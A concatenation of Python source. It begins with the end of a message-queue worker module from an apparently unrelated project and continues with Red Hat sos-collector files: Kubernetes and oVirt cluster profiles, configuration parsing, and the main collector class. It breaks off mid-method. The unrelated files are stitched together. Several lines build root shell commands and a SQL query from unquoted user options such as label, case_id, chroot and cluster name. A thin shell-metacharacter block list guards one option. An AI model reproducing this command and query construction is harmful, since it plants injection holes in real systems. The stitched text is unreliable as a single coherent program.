            elif 'job' in data:

                self._handle_job(session, data, headers)
                return
            else:
                output = self._handle_view(session, data, headers)

        except HTTPError as e:
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            output = {'cmd': 'error', 'error': self._prepare_error_msg(e.message), "code": e.code}
            log.exception("Http error occurred")
        except:
            self.current = Current(session=session, input=data)
            self.current.headers = headers
            import sys
            if hasattr(sys, '_called_from_test'):
                raise
            err = traceback.format_exc()
            output = {'error': self._prepare_error_msg(err), "code": 500}
            log.exception("Worker error occurred with messsage body:\n%s" % body)
        if 'callbackID' in input:
            output['callbackID'] = input['callbackID']
        log.info("OUTPUT for %s: %s" % (self.sessid, output))
        output['reply_timestamp'] = time()
        self.send_output(output)

    def send_output(self, output):
        # TODO: This is ugly, we should separate login process
        # log.debug("SEND_OUTPUT: %s" % output)
        if self.current.user_id is None or 'login_process' in output:
            self.client_queue.send_to_default_exchange(self.sessid, output)
        else:
            self.client_queue.send_to_prv_exchange(self.current.user_id, output)


def run_workers(no_subprocess, watch_paths=None, is_background=False):
    """
    subprocess handler
    """
    import atexit, os, subprocess, signal
    if watch_paths:
        from watchdog.observers import Observer
        # from watchdog.observers.fsevents import FSEventsObserver as Observer
        # from watchdog.observers.polling import PollingObserver as Observer
        from watchdog.events import FileSystemEventHandler


    def on_modified(event):
        if not is_background:
            print("Restarting worker due to change in %s" % event.src_path)
        log.info("modified %s" % event.src_path)
        try:
            kill_children()
            run_children()
        except:
            log.exception("Error while restarting worker")

    handler = FileSystemEventHandler()
    handler.on_modified = on_modified

    # global child_pids
    child_pids = []
    log.info("starting %s workers" % no_subprocess)

    def run_children():
        global child_pids
        child_pids = []
        for i in range(int(no_subprocess)):
            proc = subprocess.Popen([sys.executable, __file__],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            child_pids.append(proc.pid)
            log.info("Started worker with pid %s" % proc.pid)

    def kill_children():
        """
        kill subprocess on exit of manager (this) process
        """
        log.info("Stopping worker(s)")
        for pid in child_pids:
            if pid is not None:
                os.kill(pid, signal.SIGTERM)

    run_children()
    atexit.register(kill_children)
    signal.signal(signal.SIGTERM, kill_children)
    if watch_paths:
        observer = Observer()
        for path in watch_paths:
            if not is_background:
                print("Watching for changes under %s" % path)
            observer.schedule(handler, path=path, recursive=True)
        observer.start()
    while 1:
        try:
            sleep(1)
        except KeyboardInterrupt:
            log.info("Keyboard interrupt, exiting")
            if watch_paths:
                observer.stop()
                observer.join()
            sys.exit(0)


if __name__ == '__main__':
    if 'manage' in str(sys.argv):
        no_subprocess = [arg.split('manage=')[-1] for arg in sys.argv if 'manage' in arg][0]
        run_workers(no_subprocess)
    else:
        worker = Worker()
        worker.run()

# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

from soscollector.clusters import Cluster


class kubernetes(Cluster):

    packages = ('kubernetes-master',)
    sos_plugins = ['kubernetes']
    sos_plugin_options = {'kubernetes.all': 'on'}

    cmd = 'kubectl'

    option_list = [
        ('label', '', 'Filter node list to those with matching label'),
        ('role', '', 'Filter node list to those with matching role')
    ]

    def get_nodes(self):
        self.cmd += ' get nodes'
        if self.get_option('label'):
            self.cmd += ' -l %s ' % self.get_option('label')                    
        res = self.exec_master_cmd(self.cmd)
        if res['status'] == 0:
            nodes = []
            roles = [x for x in self.get_option('role').split(',') if x]
            for nodeln in res['stdout'].splitlines()[1:]:
                node = nodeln.split()
                if not roles:
                    nodes.append(node[0])
                else:
                    if node[2] in roles:
                        nodes.append(node[0])
            return nodes
        else:
            raise Exception('Node enumeration did not return usable output')


class openshift(kubernetes):

    packages = ('atomic-openshift',)
    sos_preset = 'ocp'
    cmd = 'oc'

# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

import os
import fnmatch

from soscollector.clusters import Cluster
from getpass import getpass


class ovirt(Cluster):

    packages = ('ovirt-engine',)

    option_list = [
        ('no-database', False, 'Do not collect a database dump'),
        ('cluster', '', 'Only collect from hosts in this cluster'),
        ('datacenter', '', 'Only collect from hosts in this datacenter'),
        ('no-hypervisors', False, 'Do not collect from hypervisors')
    ]

    def setup(self):
        self.pg_pass = False
        if not self.get_option('no-database'):
            self.conf = self.parse_db_conf()
        self.format_db_cmd()

    def format_db_cmd(self):
        cluster = self.get_option('cluster') or '%'                    
        datacenter = self.get_option('datacenter') or '%'                    
        self.dbcmd = '/usr/share/ovirt-engine/dbscripts/engine-psql.sh -c \"'                    
        self.dbcmd += ("select host_name from vds_static where cluster_id in "                    
                       "(select cluster_id from cluster where name like \'%s\'"
                       " and storage_pool_id in (select id from storage_pool "
                       "where name like \'%s\'))\"" % (cluster, datacenter))
        self.log_debug('Query command for ovirt DB set to: %s' % self.dbcmd)

    def get_nodes(self):
        if self.get_option('no-hypervisors'):
            return []
        res = self.exec_master_cmd(self.dbcmd, need_root=True)
        if res['status'] == 0:
            nodes = res['stdout'].splitlines()[2:-1]
            return [n.split('(')[0].strip() for n in nodes]
        else:
            raise Exception('database query failed, return code: %s'
                            % res['status'])

    def run_extra_cmd(self):
        if not self.get_option('no-database') and self.conf:
            return self.collect_database()
        return False

    def parse_db_conf(self):
        conf = {}
        engconf = '/etc/ovirt-engine/engine.conf.d/10-setup-database.conf'
        res = self.exec_master_cmd('cat %s' % engconf, need_root=True)
        if res['status'] == 0:
            config = res['stdout'].splitlines()
            for line in config:
                try:
                    k = str(line.split('=')[0])
                    v = str(line.split('=')[1].replace('"', ''))
                    conf[k] = v
                except IndexError:
                    pass
            return conf
        return False

    def collect_database(self):
        sos_opt = (
                   '-k {plugin}.dbname={db} '
                   '-k {plugin}.dbhost={dbhost} '
                   '-k {plugin}.dbport={dbport} '
                   '-k {plugin}.username={dbuser} '
                   ).format(plugin='postgresql',
                            db=self.conf['ENGINE_DB_DATABASE'],
                            dbhost=self.conf['ENGINE_DB_HOST'],
                            dbport=self.conf['ENGINE_DB_PORT'],
                            dbuser=self.conf['ENGINE_DB_USER']
                            )
        cmd = ('PGPASSWORD={} /usr/sbin/sosreport --name=postgresql '
               '--batch -o postgresql {}'
               ).format(self.conf['ENGINE_DB_PASSWORD'], sos_opt)
        db_sos = self.exec_master_cmd(cmd, need_root=True)
        for line in db_sos['stdout'].splitlines():
            if fnmatch.fnmatch(line, '*sosreport-*tar*'):
                return line.strip()
        self.log_error('Failed to gather database dump')
        return False


class rhv(ovirt):

    packages = ('rhevm', 'rhvm')
    sos_preset = 'rhv'

    def set_node_label(self, node):
        if node.address == self.master.address:
            return 'manager'
        if node.is_installed('ovirt-node-ng-nodectl'):
            return 'rhvh'
        else:
            return 'rhelh'

# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

import inspect
import os
import pipes
import re
import six
import socket
import sys


class Configuration(dict):
    """ Dict subclass that is used to handle configuration information
    needed by both SosCollector and the SosNode classes """

    def __init__(self, args=None):
        self.args = args
        self.set_defaults()
        self.parse_config()
        self.parse_options()
        self.check_user_privs()
        self.parse_node_strings()
        self['host_types'] = self._load_supported_hosts()
        self['cluster_types'] = self._load_clusters()

    def set_defaults(self):
        self['sos_mod'] = {}
        self['master'] = ''
        self['strip_sos_path'] = ''
        self['ssh_port'] = 22
        self['ssh_user'] = 'root'
        self['sos_cmd'] = 'sosreport --batch'
        self['no_local'] = False
        self['tmp_dir'] = None
        self['out_dir'] = '/var/tmp/'
        self['nodes'] = None
        self['debug'] = False
        self['tmp_dir_created'] = False
        self['cluster_type'] = None
        self['cluster'] = None
        self['password'] = False
        self['label'] = None
        self['case_id'] = None
        self['timeout'] = 300
        self['all_logs'] = False
        self['alloptions'] = False
        self['no_pkg_check'] = False
        self['hostname'] = socket.gethostname()
        ips = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
        self['ip_addrs'] = list(set(ips))
        self['cluster_options'] = []
        self['image'] = None
        self['skip_plugins'] = []
        self['enable_plugins'] = []
        self['plugin_options'] = []
        self['only_plugins'] = []
        self['list_options'] = False
        self['hostlen'] = len(self['master']) or len(self['hostname'])
        self['need_sudo'] = False
        self['sudo_pw'] = ''
        self['become_root'] = False
        self['root_password'] = ''
        self['threads'] = 4
        self['compression'] = ''
        self['verify'] = False
        self['chroot'] = ''
        self['sysroot'] = ''
        self['sos_opt_line'] = ''
        self['batch'] = False
        self['verbose'] = False
        self['preset'] = ''
        self['insecure_sudo'] = False
        self['log_size'] = 0
        self['host_types'] = []

    def parse_node_strings(self):
        '''
        Parses the given --nodes option(s) to properly format the regex
        list that we use. We cannot blindly split on ',' chars since it is a
        valid regex character, so we need to scan along the given strings and
        check at each comma if we should use the preceeding string by itself
        or not, based on if there is a valid regex at that index.
        '''
        if not self['nodes']:
            return
        nodes = []
        if not isinstance(self['nodes'], list):
            self['nodes'] = [self['nodes']]
        for node in self['nodes']:
            idxs = [i for i, m in enumerate(node) if m == ',']
            idxs.append(len(node))
            start = 0
            pos = 0
            for idx in idxs:
                try:
                    pos = idx
                    reg = node[start:idx]
                    re.compile(re.escape(reg))
                    # make sure we aren't splitting a regex value
                    if '[' in reg and ']' not in reg:
                        continue
                    nodes.append(reg.lstrip(','))
                    start = idx
                except re.error:
                    continue
            if pos != len(node):
                nodes.append(node[pos+1:])
        self['nodes'] = nodes

    def parse_config(self):
        for k in self.args:
            if self.args[k]:
                self[k] = self.args[k]
        if self['sos_opt_line']:
            self['sos_opt_line'] = pipes.quote(self['sos_opt_line'])

    def parse_cluster_options(self):
        opts = []
        if not isinstance(self['cluster_options'], list):
            self['cluster_options'] = [self['cluster_options']]
        if self['cluster_options']:
            for option in self['cluster_options']:
                cluster = option.split('.')[0]
                name = option.split('.')[1].split('=')[0]
                try:
                    # there are no instances currently where any cluster option
                    # should contain a legitimate space.
                    value = pipes.quote(option.split('=')[1].split()[0])                    
                except IndexError:
                    # conversion to boolean is handled during validation
                    value = 'True'

                opts.append(
                    ClusterOption(name, value, value.__class__, cluster)
                )
        self['cluster_options'] = opts

    def parse_options(self):
        self.parse_cluster_options()
        for opt in ['skip_plugins', 'enable_plugins', 'plugin_options',
                    'only_plugins']:
            if self[opt]:
                opts = []
                if isinstance(self[opt], six.string_types):
                    self[opt] = [self[opt]]
                for option in self[opt]:
                    opts += option.split(',')
                self[opt] = opts

    def check_user_privs(self):
        if not self['ssh_user'] == 'root':
            self['need_sudo'] = True

    def _import_modules(self, modname):
        '''Import and return all found classes in a module'''
        mod_short_name = modname.split('.')[2]
        module = __import__(modname, globals(), locals(), [mod_short_name])
        modules = inspect.getmembers(module, inspect.isclass)
        for mod in modules:
            if mod[0] in ('SosHost', 'Cluster'):
                modules.remove(mod)
        return modules

    def _find_modules_in_path(self, path, modulename):
        '''Given a path and a module name, find everything that can be imported
        and then import it

            path - the filesystem path of the package
            modulename - the name of the module in the package

        E.G. a path of 'clusters', and a modulename of 'ovirt' equates to
        importing soscollector.clusters.ovirt
        '''
        modules = []
        if os.path.exists(path):
            for pyfile in sorted(os.listdir(path)):
                if not pyfile.endswith('.py'):
                    continue
                if '__' in pyfile:
                    continue
                fname, ext = os.path.splitext(pyfile)
                modname = 'soscollector.%s.%s' % (modulename, fname)
                modules.extend(self._import_modules(modname))
        return modules

    def _load_modules(self, package, submod):
        '''Helper to import cluster and host types'''
        modules = []
        for path in package.__path__:
            if os.path.isdir(path):
                modules.extend(self._find_modules_in_path(path, submod))
        return modules

    def _load_clusters(self):
        '''Load an instance of each cluster so that sos-collector can later
        determine what type of cluster is in use
        '''
        import soscollector.clusters
        package = soscollector.clusters
        supported_clusters = {}
        clusters = self._load_modules(package, 'clusters')
        for cluster in clusters:
            supported_clusters[cluster[0]] = cluster[1](self)
        return supported_clusters

    def _load_supported_hosts(self):
        '''Load all the supported/defined host types for sos-collector.
        These will then be used to match against each node we run on
        '''
        import soscollector.hosts
        package = soscollector.hosts
        supported_hosts = {}
        hosts = self._load_modules(package, 'hosts')
        for host in hosts:
            supported_hosts[host[0]] = host[1]
        return supported_hosts


class ClusterOption():
    '''Used to store/manipulate options for cluster profiles.'''

    def __init__(self, name, value, opt_type, cluster, description=None):
        self.name = name
        self.value = value
        self.opt_type = opt_type
        self.cluster = cluster
        self.description = description

# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

import fnmatch
import inspect
import logging
import os
import random
import re
import string
import tarfile
import threading
import tempfile
import shutil
import subprocess
import sys

from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from .sosnode import SosNode
from distutils.sysconfig import get_python_lib
from getpass import getpass
from six.moves import input
from textwrap import fill
from soscollector import __version__


class SosCollector():
    '''Main sos-collector class'''

    def __init__(self, config):
        os.umask(0o77)
        self.config = config
        self.client_list = []
        self.node_list = []
        self.master = False
        self.retrieved = 0
        self.need_local_sudo = False
        self.clusters = self.config['cluster_types']
        if not self.config['list_options']:
            try:
                if not self.config['tmp_dir']:
                    self.create_tmp_dir()
                self._setup_logging()
                self.log_debug('Executing %s' % ' '.join(s for s in sys.argv))
                self.log_debug("Found cluster profiles: %s"
                               % self.clusters.keys())
                self.log_debug("Found supported host types: %s"
                               % self.config['host_types'].keys())
                self._parse_options()
                self.prep()
            except KeyboardInterrupt:
                self._exit('Exiting on user cancel', 130)

    def _setup_logging(self):
        # behind the scenes logging
        self.logger = logging.getLogger('sos_collector')
        self.logger.setLevel(logging.DEBUG)
        self.logfile = tempfile.NamedTemporaryFile(
            mode="w+",
            dir=self.config['tmp_dir'],
            delete=False)
        hndlr = logging.StreamHandler(self.logfile)
        hndlr.setFormatter(logging.Formatter(
            '%(asctime)s %(levelname)s: %(message)s'))
        hndlr.setLevel(logging.DEBUG)
        self.logger.addHandler(hndlr)

        console = logging.StreamHandler(sys.stderr)
        console.setFormatter(logging.Formatter('%(message)s'))

        # ui logging
        self.console = logging.getLogger('sos_collector_console')
        self.console.setLevel(logging.DEBUG)
        self.console_log_file = tempfile.NamedTemporaryFile(
            mode="w+",
            dir=self.config['tmp_dir'],
            delete=False)
        chandler = logging.StreamHandler(self.console_log_file)
        cfmt = logging.Formatter('%(asctime)s %(levelname)s: %(message)s')
        chandler.setFormatter(cfmt)
        self.console.addHandler(chandler)

        # also print to console
        ui = logging.StreamHandler()
        fmt = logging.Formatter('%(message)s')
        ui.setFormatter(fmt)
        if self.config['verbose']:
            ui.setLevel(logging.DEBUG)
        else:
            ui.setLevel(logging.INFO)
        self.console.addHandler(ui)

    def _exit(self, msg, error=1):
        '''Used to safely terminate if sos-collector encounters an error'''
        self.log_error(msg)
        try:
            self.close_all_connections()
        except Exception:
            pass
        sys.exit(error)

    def _parse_options(self):
        '''If there are cluster options set on the CLI, override the defaults
        '''
        if self.config['cluster_options']:
            for opt in self.config['cluster_options']:
                match = False
                for option in self.clusters[opt.cluster].options:
                    if opt.name == option.name:
                        match = True
                        # override the default from CLI
                        option.value = self._validate_option(option, opt)
                if not match:
                    self._exit('Unknown option provided: %s.%s' % (
                        opt.cluster, opt.name
                    ))

    def _validate_option(self, default, cli):
        '''Checks to make sure that the option given on the CLI is valid.
        Valid in this sense means that the type of value given matches what a
        cluster profile expects (str for str, bool for bool, etc).

        For bool options, this will also convert the string equivalent to an
        actual boolean value
        '''
        if not default.opt_type == bool:
            if not default.opt_type == cli.opt_type:
                msg = "Invalid option type for %s. Expected %s got %s"
                self._exit(msg % (cli.name, default.opt_type, cli.opt_type))
            return cli.value
        else:
            val = cli.value.lower()
            if val not in ['true', 'on', 'false', 'off']:
                msg = ("Invalid value for %s. Accepted values are: 'true', "
                       "'false', 'on', 'off'")
                self._exit(msg % cli.name)
            else:
                if val in ['true', 'on']:
                    return True
                else:
                    return False

    def log_info(self, msg):
        '''Log info messages to both console and log file'''
        self.logger.info(msg)
        self.console.info(msg)

    def log_warn(self, msg):
        '''Log warn messages to both console and log file'''
        self.logger.warn(msg)
        self.console.warn('WARNING: %s' % msg)

    def log_error(self, msg):
        '''Log error messages to both console and log file'''
        self.logger.error(msg)
        self.console.error(msg)

    def log_debug(self, msg):
        '''Log debug message to both console and log file'''
        caller = inspect.stack()[1][3]
        msg = '[sos_collector:%s] %s' % (caller, msg)
        self.logger.debug(msg)
        if self.config['verbose']:
            self.console.debug(msg)

    def create_tmp_dir(self):
        '''Creates a temp directory to transfer sosreports to'''
        tmpdir = tempfile.mkdtemp(prefix='sos-collector-', dir='/var/tmp')
        self.config['tmp_dir'] = tmpdir
        self.config['tmp_dir_created'] = True

    def list_options(self):
        '''Display options for available clusters'''
        print('\nThe following cluster options are available:\n')
        print('{:15} {:15} {:<10} {:10} {:<}'.format(
            'Cluster',
            'Option Name',
            'Type',
            'Default',
            'Description'
        ))

        for cluster in self.clusters:
            for opt in self.clusters[cluster].options:
                optln = '{:15} {:15} {:<10} {:<10} {:<10}'.format(
                    opt.cluster,
                    opt.name,
                    opt.opt_type.__name__,
                    str(opt.value),
                    opt.description
                )
                print(optln)
        print('\nOptions take the form of cluster.name=value'
              '\nE.G. "ovirt.no-database=True" or "pacemaker.offline=False"')

    def delete_tmp_dir(self):
        '''Removes the temp directory and all collected sosreports'''
        shutil.rmtree(self.config['tmp_dir'])

    def _get_archive_name(self):
        '''Generates a name for the tarball archive'''
        nstr = 'sos-collector'
        if self.config['label']:
            nstr += '-%s' % self.config['label']
        if self.config['case_id']:
            nstr += '-%s' % self.config['case_id']
        dt = datetime.strftime(datetime.now(), '%Y-%m-%d')

        try:
            string.lowercase = string.ascii_lowercase
        except NameError:
            pass

        rand = ''.join(random.choice(string.lowercase) for x in range(5))
        return '%s-%s-%s' % (nstr, dt, rand)

    def _get_archive_path(self):
        '''Returns the path, including filename, of the tarball we build
        that contains the collected sosreports
        '''
        self.arc_name = self._get_archive_name()
        compr = 'gz'
        return self.config['out_dir'] + self.arc_name + '.tar.' + compr

    def _fmt_msg(self, msg):
        width = 80
        _fmt = ''
        for line in msg.splitlines():
            _fmt = _fmt + fill(line, width, replace_whitespace=False) + '\n'
        return _fmt

    def prep(self):
        '''Based on configuration, performs setup for collection'''
        disclaimer = ("""\
This utility is used to collect sosreports from multiple \
nodes simultaneously. It uses the python-paramiko library \
to manage the SSH connections to remote systems. If this \
library is not acceptable for use in your environment, \
you should not use this utility.

An archive of sosreport tarballs collected from the nodes will be \
generated in %s and may be provided to an appropriate support representative.

The generated archive may contain data considered sensitive \
and its content should be reviewed by the originating \
organization before being passed to any third party.

No configuration changes will be made to the system running \
this utility or remote systems that it connects to.
""")
        self.console.info("\nsos-collector (version %s)\n" % __version__)
        intro_msg = self._fmt_msg(disclaimer % self.config['tmp_dir'])
        self.console.info(intro_msg)
        prompt = "\nPress ENTER to continue, or CTRL-C to quit\n"
        if not self.config['batch']:
            input(prompt)

        if not self.config['password']:
            self.log_debug('password not specified, assuming SSH keys')
            msg = ('sos-collector ASSUMES that SSH keys are installed on all '
                   'nodes unless the --password option is provided.\n')
            self.console.info(self._fmt_msg(msg))

        if self.config['password']:
            self.log_debug('password specified, not using SSH keys')
            msg = ('Provide the SSH password for user %s: '
                   % self.config['ssh_user'])
            self.config['password'] = getpass(prompt=msg)

        if self.config['need_sudo'] and not self.config['insecure_sudo']:
            if not self.config['password']:
                self.log_debug('non-root user specified, will request '
                               'sudo password')
                msg = ('A non-root user has been provided. Provide sudo '
                       'password for %s on remote nodes: '
                       % self.config['ssh_user'])
                self.config['sudo_pw'] = getpass(prompt=msg)
            else:
                if not self.config['insecure_sudo']:
                    self.config['sudo_pw'] = self.config['password']

        if self.config['become_root']:
            if not self.config['ssh_user'] == 'root':
                self.log_debug('non-root user asking to become root remotely')
                msg = ('User %s will attempt to become root. '
                       'Provide root password: ' % self.config['ssh_user'])
                self.config['root_password'] = getpass(prompt=msg)
                self.config['need_sudo'] = False
            else:
                self.log_info('Option to become root but ssh user is root.'
                              ' Ignoring request to change user on node')
                self.config['become_root'] = False

        if self.config['master']:
            self.connect_to_master()
            self.config['no_local'] = True
        else:
            try:
                self.master = SosNode('localhost', self.config)
            except Exception as err:
                self.log_debug("Unable to determine local installation: %s" %
                               err)
                self._exit('Unable to determine local installation. Use the '
                           '--no-local option if localhost should not be '
                           'included.\nAborting...\n', 1)

        if self.config['cluster_type']:
            self.config['cluster'] = self.clusters[self.config['cluster_type']]
            self.config['cluster'].master = self.master
        else:
            self.determine_cluster()
        if self.config['cluster'] is None and not self.config['nodes']:
            msg = ('Cluster type could not be determined and no nodes provided'
                   '\nAborting...')
            self._exit(msg, 1)
        if self.config['cluster']:
            self.config['cluster'].setup()
            self.config['cluster'].modify_sos_cmd()
        self.get_nodes()
        self.intro()
        self.configure_sos_cmd()

    def intro(self):
        '''Prints initial messages and collects user and case if not
        provided already.
        '''
        self.console.info('')

        if not self.node_list and not self.master.connected:
            self._exit('No nodes were detected, or nodes do not have sos '
                       'installed.\nAborting...')

        self.console.info('The following is a list of nodes to collect from:')
        if self.master.connected:
            self.console.info('\t%-*s' % (self.config['hostlen'],
                                          self.config['master']))

        for node in sorted(self.node_list):
            self.console.info("\t%-*s" % (self.config['hostlen'], node))

        self.console.info('')

        if not self.config['case_id'] and not self.config['batch']:
            msg = 'Please enter the case id you are collecting reports for: '
            self.config['case_id'] = input(msg)

    def configure_sos_cmd(self):
        '''Configures the sosreport command that is run on the nodes'''
        if self.config['sos_opt_line']:
            filt = ['&', '|', '>', '<']                    
            if any(f in self.config['sos_opt_line'] for f in filt):
                self.log_warn('Possible shell script found in provided sos '
                              'command. Ignoring --sos-cmd option entirely.')
                self.config['sos_opt_line'] = None
            else:
                self.config['sos_cmd'] = '%s %s' % (
                    self.config['sos_cmd'], self.config['sos_opt_line'])                    
                self.log_debug("User specified manual sosreport command. "
                               "Command set to %s" % self.config['sos_cmd'])
                return True
        if self.config['case_id']:
            self.config['sos_cmd'] += ' --case-id=%s' % self.config['case_id']                    
        if self.config['alloptions']:
            self.config['sos_cmd'] += ' --alloptions'
        if self.config['verify']:
            self.config['sos_cmd'] += ' --verify'
        if self.config['log_size']:
            self.config['sos_cmd'] += (' --log-size=%s'
                                       % self.config['log_size'])                    
        if self.config['sysroot']:
            self.config['sos_cmd'] += ' -s %s' % self.config['sysroot']                    
        if self.config['chroot']:
            self.config['sos_cmd'] += ' -c %s' % self.config['chroot']                    
        if self.config['compression']:
            self.config['sos_cmd'] += ' -z %s' % self.config['compression']                    
        self.log_debug('Initial sos cmd set to %s' % self.config['sos_cmd'])

    def connect_to_master(self):
        '''If run with --master, we will run cluster checks again that
        instead of the localhost.
        '''
        try:
            self.master = SosNode(self.config['master'], self.config)
        except Exception as e:
            self.log_debug('Failed to connect to master: %s' % e)
            self._exit('Could not connect to master node.\nAborting...', 1)

    def determine_cluster(self):
        '''This sets the cluster type and loads that cluster's cluster.

        If no cluster type is matched and no list of nodes is provided by
        the user, then we abort.

        If a list of nodes is given, this is not run, however the cluster
        can still be run if the user sets a --cluster-type manually
        '''
        checks = list(self.clusters.values())
        for cluster in checks:                    
            checks.remove(cluster)
            cluster.master = self.master
            if cluster.check_enabled():
                cname = cluster.__class__.__name__
                self.log_debug("Installation matches %s, checking for layered "
                               "profiles" % cname)
                for remaining in checks:
                    if issubclass(remaining.__class__, cluster.__class__):
                        rname = remaining.__class__.__name__
                        self.log_debug("Layered profile %s found. "
                                       "Checking installation"
                                       % rname)
                        remaining.master = self.master
                        if remaining.check_enabled():
                            self.log_debug("Installation matches both layered "
                                           "profile %s and base profile %s, "
                                           "setting cluster type to layered "
                                           "profile" % (rname, cname))
                            cluster = remaining
                            break

                self.config['cluster'] = cluster
                name = str(cluster.__class__.__name__).lower()
                self.config['cluster_type'] = name
                self.log_info(
                    'Cluster type set to %s' % self.config['cluster_type'])
                break

    def get_nodes_from_cluster(self):
        '''Collects the list of nodes from the determined cluster cluster'''
        if self.config['cluster_type']:
            nodes = self.config['cluster']._get_nodes()
            self.log_debug('Node list: %s' % nodes)
            return nodes

    def reduce_node_list(self):
        '''Reduce duplicate entries of the localhost and/or master node
        if applicable'''
        if (self.config['hostname'] in self.node_list and
                self.config['no_local']):
            self.node_list.remove(self.config['hostname'])
        for i in self.config['ip_addrs']:
            if i in self.node_list:
                self.node_list.remove(i)
        # remove the master node from the list, since we already have
        # an open session to it.
        if self.config['master']:
            for n in self.node_list:
                if n == self.master.hostname or n == self.config['master']:
                    self.node_list.remove(n)
        self.node_list = list(set(n for n in self.node_list if n))
        self.log_debug('Node list reduced to %s' % self.node_list)

    def compare_node_to_regex(self, node):
        '''Compares a discovered node name to a provided list of nodes from
        the user. If there is not a match, the node is removed from the list'''
        for regex in self.config['nodes']:
            try:
                regex = fnmatch.translate(regex)
                if re.match(regex, node):
                    return True
            except re.error as err:
                msg = 'Error comparing %s to provided node regex %s: %s'
                self.log_debug(msg % (node, regex, err))
        return False

    def get_nodes(self):
        ''' Sets the list of nodes to collect sosreports from '''
        if not self.config['master'] and not self.config['cluster']:
            msg = ('Could not determine a cluster type and no list of '
                   'nodes or master node was provided.\nAborting...'
                   )
            self._exit(msg)

        try:
            nodes = self.get_nodes_from_cluster()
            if self.config['nodes']:
                for node in nodes:
                    if self.compare_node_to_regex(node):
                        self.node_list.append(node)
            else:
                self.node_list = nodes
        except Exception as e:
            self.log_debug("Error parsing node list: %s" % e)
            self.log_debug('Setting node list to --nodes option')
            self.node_list = self.config['nodes']
            for node in self.node_list:
                if any(i in node for i in ('*', '\\', '?', '(', ')', '/')):
                    self.node_list.remove(node)

        # force add any non-regex node strings from nodes option
        if self.config['nodes']:
            for node in self.config['nodes']:
                if any(i in node for i in '*\\?()/[]'):
                    continue
                if node not in self.node_list:
                    self.log_debug("Force adding %s to node list" % node)
                    self.node_list.append(node)

        if not self.config['master']:
            host = self.config['hostname'].split('.')[0]
            # trust the local hostname before the node report from cluster
            for node in self.node_list:
                if host == node.split('.')[0]:
                    self.node_list.remove(node)
            self.node_list.append(self.config['hostname'])
        self.reduce_node_list()
        try:
            self.config['hostlen'] = len(max(self.node_list, key=len))
        except (TypeError, ValueError):
            self.config['hostlen'] = len(self.config['master'])

    def _connect_to_node(self, node):
        '''Try to connect to the node, and if we can add to the client list to
        run sosreport on
        '''
        try:
            client = SosNode(node, self.config)
            if client.connected:
                self.client_list.append(client)
            else:
                client.close_ssh_session()
        except Exception:
            pass

    def collect(self):
        ''' For each node, start a collection thread and then tar all
        collected sosreports '''
        if self.master.connected:
            self.client_list.append(self.master)
        self.console.info("\nConnecting to nodes...")
        filters = [self.master.address, self.master.hostname]
        nodes = [n for n in self.node_list if n not in filters]

        try:
            pool = ThreadPoolExecutor(self.config['threads'])
            pool.map(self._connect_to_node, nodes, chunksize=1)
            pool.shutdown(wait=True)

            self.report_num = len(self.client_list)
            if self.config['no_local'] and self.master.address == 'localhost':
                self.report_num -= 1

            self.console.info("\nBeginning collection of sosreports from %s "
                              "nodes, collecting a maximum of %s "
                              "concurrently\n"
                              % (self.report_num, self.config['threads'])
                              )

            pool = ThreadPoolExecutor(self.config['threads'])
            pool.map(self._collect, self.client_list, chunksize=1)
            pool.shutdown(wait=True)
        except KeyboardInterrupt:
            self.log_error('Exiting on user cancel\n')
            os._exit(130)

        if hasattr(self.config['cluster'], 'run_extra_cmd'):
            self.console.info('Collecting additional data from master node...')
            files = self.config['cluster']._run_extra_cmd()
            if files:
                self.master.collect_extra_cmd(files)
        msg = '\nSuccessfully captured %s of %s sosreports'
        self.log_info(msg % (self.retrieved, self.report_num))
        if self.retrieved > 0:
            self.create_cluster_archive()
        else:
            msg = 'No sosreports were collected, nothing to archive...'
            self._exit(msg, 1)
        self.close_all_connections()

    def _collect(self, client):
        '''Runs sosreport on each node'''
        try:
            if not client.local:
                client.sosreport()
            else:
                if not self.config['no_local']:
                    client.sosreport()
            if client.retrieved:
                self.retrieved += 1
        except Exception as err:
            self.log_error("Error running sosreport: %s" % err)

    def close_all_connections(self):
